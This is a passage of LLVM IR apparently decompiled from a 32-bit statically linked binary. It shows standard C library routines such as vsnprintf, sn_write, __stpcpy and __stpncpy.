  %v1_8050f53 = inttoptr i32 %v1_8050f4c to i32*
  %v2_8050f53 = load i32, i32* %v1_8050f53, align 4
  %v1_8050f55 = load i32, i32* @ebx, align 4
  %v2_8050f55 = add i32 %v1_8050f55, 56
  %v3_8050f55 = inttoptr i32 %v2_8050f55 to i32*
  store i32 %v2_8050f53, i32* %v3_8050f55, align 4
  %v0_8050f58 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f58 = inttoptr i32 %v0_8050f58 to i32*
  %v2_8050f58 = load i32, i32* %v1_8050f58, align 4
  %v1_8050f5a = icmp eq i32 %v2_8050f58, 0
  br i1 %v1_8050f5a, label %dec_label_pc_8050f61, label %dec_label_pc_8050f5e

dec_label_pc_8050f5e:                             ; preds = %entry
  %v0_8050f5e = load i32, i32* @ebx, align 4
  %v2_8050f5e = add i32 %v2_8050f58, 52
  %v3_8050f5e = inttoptr i32 %v2_8050f5e to i32*
  store i32 %v0_8050f5e, i32* %v3_8050f5e, align 4
  %v1_8050f61.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f61

dec_label_pc_8050f61:                             ; preds = %entry, %dec_label_pc_8050f5e
  %v1_8050f61 = phi i32 [ %v0_8050f58, %entry ], [ %v1_8050f61.pre, %dec_label_pc_8050f5e ]
  %v0_8050f61 = load i32, i32* @ebx, align 4
  %v2_8050f61 = inttoptr i32 %v1_8050f61 to i32*
  store i32 %v0_8050f61, i32* %v2_8050f61, align 4
  %v0_8050f63 = call i32 @__ofl_unlock()
  %v0_8050f68 = load i32, i32* @ebx, align 4
  %v2_8050f6a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050f6a, i32* @edx, align 4
  ret i32 %v0_8050f68

; uselistorder directives
  uselistorder i32 ()* @__ofl_unlock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050f61, { 1, 0 }
}

define i32 @vsnprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-13 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8050f70 = load i32, i32* @edi, align 4
  %v0_8050f71 = load i32, i32* @esi, align 4
  %v0_8050f72 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f72, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg1, i32* @edi, align 4
  %v3_8050f94 = bitcast i32* %stack_var_-152 to i8*
  %v4_8050f94 = call i32 @memset(i8* %v3_8050f94, i32 0, i32 136)
  %v0_8050f99 = load i32, i32* @esi, align 4
  %v1_8050f99 = add i32 %v0_8050f99, -1
  %tmp = icmp ult i32 %v1_8050f99, 2147483647
  br i1 %tmp, label %entry.dec_label_pc_8050fdb_crit_edge, label %dec_label_pc_8050fbb

entry.dec_label_pc_8050fdb_crit_edge:             ; preds = %entry
  %v0_8050fdb.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050fdb

dec_label_pc_8050fbb:                             ; preds = %entry
  %v1_8050fbb = icmp eq i32 %v0_8050f99, 0
  br i1 %v1_8050fbb, label %dec_label_pc_8050fcf, label %dec_label_pc_8050fbf

dec_label_pc_8050fbf:                             ; preds = %dec_label_pc_8050fbb
  %v1_8050fbf = call i32 @__errno_location(i32 134549567)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8050fc7 = inttoptr i32 %v1_8050fbf to i32*
  store i32 75, i32* %v1_8050fc7, align 4
  br label %dec_label_pc_8051033

dec_label_pc_8050fcf:                             ; preds = %dec_label_pc_8050fbb
  %v2_8050fcf = ptrtoint i32* %stack_var_-13 to i32
  store i32 %v2_8050fcf, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  br label %dec_label_pc_8050fdb

dec_label_pc_8050fdb:                             ; preds = %entry.dec_label_pc_8050fdb_crit_edge, %dec_label_pc_8050fcf
  %v0_8050fe6 = phi i32 [ %v0_8050f99, %entry.dec_label_pc_8050fdb_crit_edge ], [ 1, %dec_label_pc_8050fcf ]
  %v0_8050fe8 = phi i32 [ %v0_8050fdb.pre, %entry.dec_label_pc_8050fdb_crit_edge ], [ %v2_8050fcf, %dec_label_pc_8050fcf ]
  %v1_8050fdf = sub i32 -2, %v0_8050fe8
  %tmp26 = icmp ugt i32 %v1_8050fdf, %v0_8050fe6
  br i1 %tmp26, label %dec_label_pc_8050fe6, label %dec_label_pc_8050fe8

dec_label_pc_8050fe6:                             ; preds = %dec_label_pc_8050fdb
  br label %dec_label_pc_8050fe8

dec_label_pc_8050fe8:                             ; preds = %dec_label_pc_8050fdb, %dec_label_pc_8050fe6
  %storemerge = phi i32 [ %v0_8050fe6, %dec_label_pc_8050fe6 ], [ %v1_8050fdf, %dec_label_pc_8050fdb ]
  %v1_8050fe8 = phi i32 [ %v0_8050fe6, %dec_label_pc_8050fe6 ], [ %v1_8050fdf, %dec_label_pc_8050fdb ]
  store i32 %storemerge, i32* @ebx, align 4
  %v2_8050fe8 = add i32 %v1_8050fe8, %v0_8050fe8
  %v5_8051013 = call i32 @vfprintf(i32* nonnull %stack_var_-152, i32 %arg3, i32 %arg4, i32 %v2_8050fe8)
  %v0_805101b = load i32, i32* @ebx, align 4
  %v1_805101b = icmp eq i32 %v0_805101b, 0
  store i32 %v5_8051013, i32* %ecx.global-to-local, align 4
  br i1 %v1_805101b, label %dec_label_pc_8051033, label %dec_label_pc_8051021

dec_label_pc_8051021:                             ; preds = %dec_label_pc_8050fe8
  %v15_8051027 = icmp eq i32 %v1_8050fe8, 0
  %v2_805102e = sext i1 %v15_8051027 to i32
  %v3_805102e = add i32 %v2_805102e, %v0_8050fe8
  %v4_805102e = inttoptr i32 %v3_805102e to i8*
  store i8 0, i8* %v4_805102e, align 1
  br label %dec_label_pc_8051033

dec_label_pc_8051033:                             ; preds = %dec_label_pc_8050fe8, %dec_label_pc_8050fbf, %dec_label_pc_8051021
  %v0_8051039 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805103b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805103b, i32* @ebx, align 4
  store i32 %v0_8050f71, i32* @esi, align 4
  store i32 %v0_8050f70, i32* @edi, align 4
  ret i32 %v0_8051039

; uselistorder directives
  uselistorder i32 %v1_8050fe8, { 1, 0 }
  uselistorder i32 %v1_8050fdf, { 1, 2, 0 }
  uselistorder i32 %v0_8050fe6, { 1, 2, 0 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051033, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050fe8, { 1, 0 }
  uselistorder label %dec_label_pc_8050fdb, { 1, 0 }
}

define i32 @sn_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051041 = load i32, i32* @ebx, align 4
  store i32 %v0_8051041, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805104a = add i32 %arg1, 20
  %v2_805104a = inttoptr i32 %v1_805104a to i32*
  %v3_805104a = load i32, i32* %v2_805104a, align 4
  %v1_805104d = add i32 %arg1, 16
  %v2_805104d = inttoptr i32 %v1_805104d to i32*
  %v3_805104d = load i32, i32* %v2_805104d, align 4
  %v2_8051052 = sub i32 %v3_805104d, %v3_805104a
  %tmp = icmp ult i32 %v2_8051052, %arg3
  br i1 %tmp, label %dec_label_pc_8051058, label %dec_label_pc_805105a

dec_label_pc_8051058:                             ; preds = %entry
  br label %dec_label_pc_805105a

dec_label_pc_805105a:                             ; preds = %entry, %dec_label_pc_8051058
  %storemerge = phi i32 [ %v2_8051052, %dec_label_pc_8051058 ], [ %arg3, %entry ]
  %v0_805105b = phi i32 [ %v2_8051052, %dec_label_pc_8051058 ], [ %arg3, %entry ]
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v3_8051061 = inttoptr i32 %v3_805104a to i8*
  %v4_8051061 = call i32 @memcpy(i8* %v3_8051061, i32 %arg2, i32 %v0_805105b)
  %v0_8051066 = load i32, i32* @edi, align 4
  %v0_805106b = load i32, i32* @esi, align 4
  %v1_805106b = add i32 %v0_805106b, 20
  %v2_805106b = inttoptr i32 %v1_805106b to i32*
  %v3_805106b = load i32, i32* %v2_805106b, align 4
  %v4_805106b = load i32, i32* %ebx.global-to-local, align 4
  %v5_805106b = add i32 %v4_805106b, %v3_805106b
  store i32 %v5_805106b, i32* %v2_805106b, align 4
  %v2_805106e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805106e, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051066

; uselistorder directives
  uselistorder i32 %v2_8051052, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805105a, { 1, 0 }
}

define i32 @__stpcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-8 = alloca i32, align 4
  %v0_8051081 = load i32, i32* @ebx, align 4
  store i32 %v0_8051081, i32* %stack_var_-8, align 4
  %v4_8051082 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051082, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @edx, align 4
  %v1_805108e = urem i32 %v4_8051082, 4
  %v1_8051091 = urem i32 %arg2, 4
  %v2_8051091 = icmp eq i32 %v1_8051091, 0
  store i32 %v1_8051091, i32* %ebx.global-to-local, align 4
  %v12_8051094 = icmp eq i32 %v1_8051091, %v1_805108e
  store i1 %v12_8051094, i1* %zf.global-to-local, align 1
  br i1 %v12_8051094, label %dec_label_pc_80510b6, label %dec_label_pc_8051098

dec_label_pc_8051098:                             ; preds = %entry, %dec_label_pc_80510fd
  %v2_805109d = phi i32 [ %v4_8051082, %entry ], [ %v1_80510e0.lcssa, %dec_label_pc_80510fd ]
  %v0_8051098 = phi i32 [ %arg2, %entry ], [ %v0_80510ff.lcssa, %dec_label_pc_80510fd ]
  %v1_8051098 = inttoptr i32 %v0_8051098 to i8*
  %v2_8051098 = load i8, i8* %v1_8051098, align 1
  %v4_805109b = icmp eq i8 %v2_8051098, 0
  store i1 %v4_805109b, i1* %zf.global-to-local, align 1
  %v3_805109d = inttoptr i32 %v2_805109d to i8*
  store i8 %v2_8051098, i8* %v3_805109d, align 1
  %v0_805109f = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805109f, label %dec_label_pc_80510b1, label %dec_label_pc_80510a1

dec_label_pc_80510a1:                             ; preds = %dec_label_pc_8051098, %dec_label_pc_80510a1
  %v0_80510a1 = load i32, i32* @edx, align 4
  %v1_80510a1 = add i32 %v0_80510a1, 1
  %v2_80510a1 = inttoptr i32 %v1_80510a1 to i8*
  %v3_80510a1 = load i8, i8* %v2_80510a1, align 1
  %v0_80510a5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80510a5 = add i32 %v0_80510a5, 1
  store i32 %v1_80510a5, i32* %ecx.global-to-local, align 4
  store i32 %v1_80510a1, i32* @edx, align 4
  %v4_80510ab = icmp eq i8 %v3_80510a1, 0
  store i1 %v4_80510ab, i1* %zf.global-to-local, align 1
  %v3_80510ad = inttoptr i32 %v1_80510a5 to i8*
  store i8 %v3_80510a1, i8* %v3_80510ad, align 1
  %v0_80510af = load i1, i1* %zf.global-to-local, align 1
  %v1_80510af = icmp eq i1 %v0_80510af, false
  br i1 %v1_80510af, label %dec_label_pc_80510a1, label %dec_label_pc_80510b1

dec_label_pc_80510b1:                             ; preds = %dec_label_pc_80510cd, %dec_label_pc_80510a1, %dec_label_pc_8051098
  %v2_80510b1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80510b1, i32* @ebx, align 4
  %v0_80510b2 = load i32, i32* %ecx.global-to-local, align 4
  ret i32 %v0_80510b2

dec_label_pc_80510b6:                             ; preds = %entry
  store i1 %v2_8051091, i1* %zf.global-to-local, align 1
  %v1_80510b8 = icmp eq i1 %v2_8051091, false
  br i1 %v1_80510b8, label %dec_label_pc_80510cd, label %dec_label_pc_80510d8

dec_label_pc_80510c2:                             ; preds = %dec_label_pc_80510cd
  %v0_80510c2 = load i32, i32* @edx, align 4
  %v1_80510c2 = add i32 %v0_80510c2, 1
  store i32 %v1_80510c2, i32* @edx, align 4
  %v0_80510c5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80510c5 = add i32 %v0_80510c5, 1
  store i32 %v1_80510c5, i32* %ecx.global-to-local, align 4
  %v2_80510c8 = urem i32 %v1_80510c2, 4
  %v3_80510c8 = icmp eq i32 %v2_80510c8, 0
  store i1 %v3_80510c8, i1* %zf.global-to-local, align 1
  br i1 %v3_80510c8, label %dec_label_pc_80510d8, label %dec_label_pc_80510cd

dec_label_pc_80510cd:                             ; preds = %dec_label_pc_80510b6, %dec_label_pc_80510c2
  %v2_80510d2 = phi i32 [ %v1_80510c5, %dec_label_pc_80510c2 ], [ %v4_8051082, %dec_label_pc_80510b6 ]
  %v0_80510cd = phi i32 [ %v1_80510c2, %dec_label_pc_80510c2 ], [ %arg2, %dec_label_pc_80510b6 ]
  %v1_80510cd = inttoptr i32 %v0_80510cd to i8*
  %v2_80510cd = load i8, i8* %v1_80510cd, align 1
  %v4_80510d0 = icmp eq i8 %v2_80510cd, 0
  store i1 %v4_80510d0, i1* %zf.global-to-local, align 1
  %v3_80510d2 = inttoptr i32 %v2_80510d2 to i8*
  store i8 %v2_80510cd, i8* %v3_80510d2, align 1
  %v0_80510d4 = load i1, i1* %zf.global-to-local, align 1
  %v1_80510d4 = icmp eq i1 %v0_80510d4, false
  br i1 %v1_80510d4, label %dec_label_pc_80510c2, label %dec_label_pc_80510b1

dec_label_pc_80510d8:                             ; preds = %dec_label_pc_80510c2, %dec_label_pc_80510b6
  %v0_80510da = phi i32 [ %arg2, %dec_label_pc_80510b6 ], [ %v1_80510c2, %dec_label_pc_80510c2 ]
  %v0_80510d8 = phi i32 [ %v4_8051082, %dec_label_pc_80510b6 ], [ %v1_80510c5, %dec_label_pc_80510c2 ]
  store i32 %v0_80510d8, i32* %esi.global-to-local, align 4
  store i32 %v0_80510da, i32* %ebx.global-to-local, align 4
  %v1_80510e817 = inttoptr i32 %v0_80510da to i32*
  %v2_80510e818 = load i32, i32* %v1_80510e817, align 4
  store i32 %v2_80510e818, i32* %ecx.global-to-local, align 4
  %v1_80510ec19 = add i32 %v2_80510e818, -16843009
  %v1_80510f220 = sub i32 -1, %v2_80510e818
  %v2_80510f421 = and i32 %v1_80510ec19, %v1_80510f220
  %v1_80510f622 = and i32 %v2_80510f421, -2139062144
  %v2_80510f623 = icmp eq i32 %v1_80510f622, 0
  br i1 %v2_80510f623, label %dec_label_pc_80510e0, label %dec_label_pc_80510fd

dec_label_pc_80510e0:                             ; preds = %dec_label_pc_80510d8, %dec_label_pc_80510e0
  %v2_80510e825 = phi i32 [ %v2_80510e8, %dec_label_pc_80510e0 ], [ %v2_80510e818, %dec_label_pc_80510d8 ]
  %v1_80510e024 = phi i32 [ %v1_80510e5, %dec_label_pc_80510e0 ], [ %v0_80510d8, %dec_label_pc_80510d8 ]
  %v2_80510e0 = inttoptr i32 %v1_80510e024 to i32*
  store i32 %v2_80510e825, i32* %v2_80510e0, align 4
  %v0_80510e2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80510e2 = add i32 %v0_80510e2, 4
  store i32 %v1_80510e2, i32* %ebx.global-to-local, align 4
  %v0_80510e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80510e5 = add i32 %v0_80510e5, 4
  store i32 %v1_80510e5, i32* %esi.global-to-local, align 4
  %v1_80510e8 = inttoptr i32 %v1_80510e2 to i32*
  %v2_80510e8 = load i32, i32* %v1_80510e8, align 4
  store i32 %v2_80510e8, i32* %ecx.global-to-local, align 4
  %v1_80510ec = add i32 %v2_80510e8, -16843009
  %v1_80510f2 = sub i32 -1, %v2_80510e8
  %v2_80510f4 = and i32 %v1_80510ec, %v1_80510f2
  %v1_80510f6 = and i32 %v2_80510f4, -2139062144
  %v2_80510f6 = icmp eq i32 %v1_80510f6, 0
  br i1 %v2_80510f6, label %dec_label_pc_80510e0, label %dec_label_pc_80510fd

dec_label_pc_80510fd:                             ; preds = %dec_label_pc_80510e0, %dec_label_pc_80510d8
  %v1_80510e0.lcssa = phi i32 [ %v0_80510d8, %dec_label_pc_80510d8 ], [ %v1_80510e5, %dec_label_pc_80510e0 ]
  %v0_80510ff.lcssa = phi i32 [ %v0_80510da, %dec_label_pc_80510d8 ], [ %v1_80510e2, %dec_label_pc_80510e0 ]
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v1_80510e0.lcssa, i32* %ecx.global-to-local, align 4
  store i32 %v0_80510ff.lcssa, i32* @edx, align 4
  br label %dec_label_pc_8051098

; uselistorder directives
  uselistorder i32 %v2_80510e8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80510e5, { 0, 2, 1 }
  uselistorder i32 %v2_80510e818, { 1, 0, 2, 3 }
  uselistorder i1 %v3_80510c8, { 1, 0 }
  uselistorder i32 %v1_80510c2, { 1, 2, 0, 3 }
  uselistorder i1 %v12_8051094, { 1, 0 }
  uselistorder i32 %v1_8051091, { 0, 2, 1 }
  uselistorder i32 %v4_8051082, { 2, 1, 3, 0, 4 }
  uselistorder i1* %zf.global-to-local, { 9, 1, 2, 0, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 5, 6, 4, 7, 8 }
  uselistorder i32 %arg2, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_80510e0, { 1, 0 }
  uselistorder label %dec_label_pc_80510cd, { 1, 0 }
  uselistorder label %dec_label_pc_80510a1, { 1, 0 }
  uselistorder label %dec_label_pc_8051098, { 1, 0 }
}

define i32 @__stpncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %v0_8051110 = load i32, i32* @edi, align 4
  %v4_8051116 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051116, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_8051126 = urem i32 %v4_8051116, 4
  %v1_8051129 = urem i32 %arg2, 4
  %v2_8051129 = icmp eq i32 %v1_8051129, 0
  store i32 %v1_8051129, i32* %esi.global-to-local, align 4
  %v12_805112c = icmp eq i32 %v1_8051129, %v1_8051126
  store i1 %v12_805112c, i1* %zf.global-to-local, align 1
  br i1 %v12_805112c, label %dec_label_pc_8051174, label %dec_label_pc_8051130

dec_label_pc_8051130:                             ; preds = %entry, %dec_label_pc_80511d5
  %v2_8051139 = phi i32 [ %v4_8051116, %entry ], [ %v0_80511d5, %dec_label_pc_80511d5 ]
  %v0_8051134 = phi i32 [ %arg2, %entry ], [ %v0_80511d7, %dec_label_pc_80511d5 ]
  %v0_8051130 = phi i32 [ %arg3, %entry ], [ %v0_805113022, %dec_label_pc_80511d5 ]
  %v1_8051130 = icmp eq i32 %v0_8051130, 0
  store i1 %v1_8051130, i1* %zf.global-to-local, align 1
  br i1 %v1_8051130, label %dec_label_pc_8051157, label %dec_label_pc_8051134

dec_label_pc_8051134:                             ; preds = %dec_label_pc_8051130
  %v1_8051134 = inttoptr i32 %v0_8051134 to i8*
  %v2_8051134 = load i8, i8* %v1_8051134, align 1
  %v4_8051137 = icmp eq i8 %v2_8051134, 0
  store i1 %v4_8051137, i1* %zf.global-to-local, align 1
  %v3_8051139 = inttoptr i32 %v2_8051139 to i8*
  store i8 %v2_8051134, i8* %v3_8051139, align 1
  %v0_805113b = load i1, i1* %zf.global-to-local, align 1
  %v1_805113b = icmp eq i1 %v0_805113b, false
  br i1 %v1_805113b, label %dec_label_pc_805114f, label %dec_label_pc_8051157

dec_label_pc_8051142:                             ; preds = %dec_label_pc_805114f
  %v0_8051142 = load i32, i32* @edx, align 4
  %v1_8051142 = add i32 %v0_8051142, 1
  %v2_8051142 = inttoptr i32 %v1_8051142 to i8*
  %v3_8051142 = load i8, i8* %v2_8051142, align 1
  store i32 %v1_8051142, i32* @edx, align 4
  %v4_8051149 = icmp eq i8 %v3_8051142, 0
  store i1 %v4_8051149, i1* %zf.global-to-local, align 1
  %v3_805114b = inttoptr i32 %v1_805114f to i8*
  store i8 %v3_8051142, i8* %v3_805114b, align 1
  %v0_805114d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805114d, label %dec_label_pc_8051157, label %dec_label_pc_805114f

dec_label_pc_805114f:                             ; preds = %dec_label_pc_8051134, %dec_label_pc_8051142
  %v0_805114f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805114f = add i32 %v0_805114f, 1
  store i32 %v1_805114f, i32* %ebx.global-to-local, align 4
  %v0_8051152 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051152 = add i32 %v0_8051152, -1
  %v9_8051152 = icmp eq i32 %v1_8051152, 0
  store i1 %v9_8051152, i1* %zf.global-to-local, align 1
  store i32 %v1_8051152, i32* %ecx.global-to-local, align 4
  %v1_8051155 = icmp eq i1 %v9_8051152, false
  br i1 %v1_8051155, label %dec_label_pc_8051142, label %dec_label_pc_8051157

dec_label_pc_8051157:                             ; preds = %dec_label_pc_8051178, %dec_label_pc_8051142, %dec_label_pc_805114f, %dec_label_pc_8051134, %dec_label_pc_8051197, %dec_label_pc_8051193, %dec_label_pc_8051130
  %v0_8051157 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051157 = inttoptr i32 %v0_8051157 to i8*
  %v0_805115a = load i32, i32* %ecx.global-to-local, align 4
  %v5_8051166 = call i32 @memset(i8* %v4_8051157, i32 0, i32 %v0_805115a)
  %v0_805116b = load i32, i32* @esp, align 4
  %v6_805116b = icmp eq i32 %v0_805116b, -16
  store i1 %v6_805116b, i1* %zf.global-to-local, align 1
  %v0_805116e = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051110, i32* @edi, align 4
  ret i32 %v0_805116e

dec_label_pc_8051174:                             ; preds = %entry
  store i1 %v2_8051129, i1* %zf.global-to-local, align 1
  br i1 %v2_8051129, label %dec_label_pc_8051193, label %dec_label_pc_8051178

dec_label_pc_8051178:                             ; preds = %dec_label_pc_8051174, %dec_label_pc_8051185
  %v2_8051181 = phi i32 [ %v1_805118b, %dec_label_pc_8051185 ], [ %v4_8051116, %dec_label_pc_8051174 ]
  %v0_805117c = phi i32 [ %v1_8051185, %dec_label_pc_8051185 ], [ %arg2, %dec_label_pc_8051174 ]
  %v0_8051178 = phi i32 [ %v1_8051188, %dec_label_pc_8051185 ], [ %arg3, %dec_label_pc_8051174 ]
  %v1_8051178 = icmp eq i32 %v0_8051178, 0
  store i1 %v1_8051178, i1* %zf.global-to-local, align 1
  br i1 %v1_8051178, label %dec_label_pc_8051157, label %dec_label_pc_805117c

dec_label_pc_805117c:                             ; preds = %dec_label_pc_8051178
  %v1_805117c = inttoptr i32 %v0_805117c to i8*
  %v2_805117c = load i8, i8* %v1_805117c, align 1
  %v4_805117f = icmp eq i8 %v2_805117c, 0
  store i1 %v4_805117f, i1* %zf.global-to-local, align 1
  %v3_8051181 = inttoptr i32 %v2_8051181 to i8*
  store i8 %v2_805117c, i8* %v3_8051181, align 1
  %v0_8051183 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8051183, label %dec_label_pc_805117c.dec_label_pc_8051193.loopexit_crit_edge, label %dec_label_pc_8051185

dec_label_pc_805117c.dec_label_pc_8051193.loopexit_crit_edge: ; preds = %dec_label_pc_805117c
  %v0_8051193.pre.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051193

dec_label_pc_8051185:                             ; preds = %dec_label_pc_805117c
  %v0_8051185 = load i32, i32* @edx, align 4
  %v1_8051185 = add i32 %v0_8051185, 1
  store i32 %v1_8051185, i32* @edx, align 4
  %v0_8051188 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051188 = add i32 %v0_8051188, -1
  store i32 %v1_8051188, i32* %ecx.global-to-local, align 4
  %v0_805118b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805118b = add i32 %v0_805118b, 1
  store i32 %v1_805118b, i32* %ebx.global-to-local, align 4
  %v2_805118e = urem i32 %v1_8051185, 4
  %v3_805118e = icmp eq i32 %v2_805118e, 0
  store i1 %v3_805118e, i1* %zf.global-to-local, align 1
  %v1_8051191 = icmp eq i1 %v3_805118e, false
  br i1 %v1_8051191, label %dec_label_pc_8051178, label %dec_label_pc_8051193

dec_label_pc_8051193:                             ; preds = %dec_label_pc_8051185, %dec_label_pc_805117c.dec_label_pc_8051193.loopexit_crit_edge, %dec_label_pc_8051174
  %v0_805119c = phi i32 [ %arg3, %dec_label_pc_8051174 ], [ %v0_8051193.pre.pre, %dec_label_pc_805117c.dec_label_pc_8051193.loopexit_crit_edge ], [ %v1_8051188, %dec_label_pc_8051185 ]
  %v1_8051193 = icmp eq i32 %v0_805119c, 0
  store i1 %v1_8051193, i1* %zf.global-to-local, align 1
  br i1 %v1_8051193, label %dec_label_pc_8051157, label %dec_label_pc_8051197

dec_label_pc_8051197:                             ; preds = %dec_label_pc_8051193
  %v0_8051197 = load i32, i32* @edx, align 4
  %v1_8051197 = inttoptr i32 %v0_8051197 to i8*
  %v2_8051197 = load i8, i8* %v1_8051197, align 1
  %v3_8051197 = icmp eq i8 %v2_8051197, 0
  store i1 %v3_8051197, i1* %zf.global-to-local, align 1
  br i1 %v3_8051197, label %dec_label_pc_8051157, label %dec_label_pc_805119c

dec_label_pc_805119c:                             ; preds = %dec_label_pc_8051197
  %v9_805119c = icmp eq i32 %v0_805119c, 3
  store i1 %v9_805119c, i1* %zf.global-to-local, align 1
  %v0_805119f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805119f, i32* %esi.global-to-local, align 4
  store i32 %v0_8051197, i32* @edi, align 4
  %tmp = icmp ult i32 %v0_805119c, 4
  br i1 %tmp, label %dec_label_pc_80511d5, label %dec_label_pc_80511c2.preheader

dec_label_pc_80511c2.preheader:                   ; preds = %dec_label_pc_805119c
  %storemerge.in41 = inttoptr i32 %v0_8051197 to i32*
  %storemerge42 = load i32, i32* %storemerge.in41, align 4
  store i32 %storemerge42, i32* %ebx.global-to-local, align 4
  %v1_80511c443 = add i32 %storemerge42, -16843009
  %v1_80511ca44 = sub i32 -1, %storemerge42
  %v2_80511cc45 = and i32 %v1_80511c443, %v1_80511ca44
  %v1_80511ce46 = and i32 %v2_80511cc45, -2139062144
  %v2_80511ce47 = icmp eq i32 %v1_80511ce46, 0
  br i1 %v2_80511ce47, label %dec_label_pc_80511b0, label %dec_label_pc_80511d5.loopexit

dec_label_pc_80511b0:                             ; preds = %dec_label_pc_80511c2.preheader, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge
  %storemerge51 = phi i32 [ %storemerge, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ], [ %storemerge42, %dec_label_pc_80511c2.preheader ]
  %v0_80511b350 = phi i32 [ %storemerge.in.in.pre, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ], [ %v0_8051197, %dec_label_pc_80511c2.preheader ]
  %v0_80511b049 = phi i32 [ %v0_80511bb, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ], [ %v0_805119c, %dec_label_pc_80511c2.preheader ]
  %v1_80511b648 = phi i32 [ %v1_80511b8, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ], [ %v0_805119f, %dec_label_pc_80511c2.preheader ]
  %v1_80511b0 = add i32 %v0_80511b049, -4
  store i32 %v1_80511b0, i32* %ecx.global-to-local, align 4
  %v1_80511b3 = add i32 %v0_80511b350, 4
  store i32 %v1_80511b3, i32* @edi, align 4
  %v2_80511b6 = inttoptr i32 %v1_80511b648 to i32*
  store i32 %storemerge51, i32* %v2_80511b6, align 4
  %v0_80511b8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80511b8 = add i32 %v0_80511b8, 4
  store i32 %v1_80511b8, i32* %esi.global-to-local, align 4
  %v0_80511bb = load i32, i32* %ecx.global-to-local, align 4
  %tmp61 = icmp ult i32 %v0_80511bb, 4
  br i1 %tmp61, label %dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge, label %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge

dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge: ; preds = %dec_label_pc_80511b0
  %v9_80511bb = icmp eq i32 %v0_80511bb, 3
  %v0_80511d7.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80511d5.loopexit

dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge: ; preds = %dec_label_pc_80511b0
  %storemerge.in.in.pre = load i32, i32* @edi, align 4
  %storemerge.in = inttoptr i32 %storemerge.in.in.pre to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_80511c4 = add i32 %storemerge, -16843009
  %v1_80511ca = sub i32 -1, %storemerge
  %v2_80511cc = and i32 %v1_80511c4, %v1_80511ca
  %v1_80511ce = and i32 %v2_80511cc, -2139062144
  %v2_80511ce = icmp eq i32 %v1_80511ce, 0
